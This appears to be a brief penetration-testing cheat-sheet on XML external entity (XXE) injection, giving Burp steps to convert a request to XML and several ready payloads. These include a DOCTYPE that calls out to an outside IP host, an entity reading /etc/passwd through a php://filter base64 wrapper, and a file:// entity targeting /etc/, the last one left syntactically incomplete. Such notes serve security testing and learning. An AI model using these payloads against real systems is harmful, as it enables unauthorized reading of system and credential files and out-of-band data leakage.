
1. Use Convert to XML in Burp and modify the XML data
2. We can try changing the `Content-Type:` to `text/xml`
3. Add a doctype: `<!DOCTYPE test SYSTEM "http://10.21.31.111:8000/hello">`

 


### Examples

```sh
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```

Might work in java based apps? https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
```sh
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/" >]
```


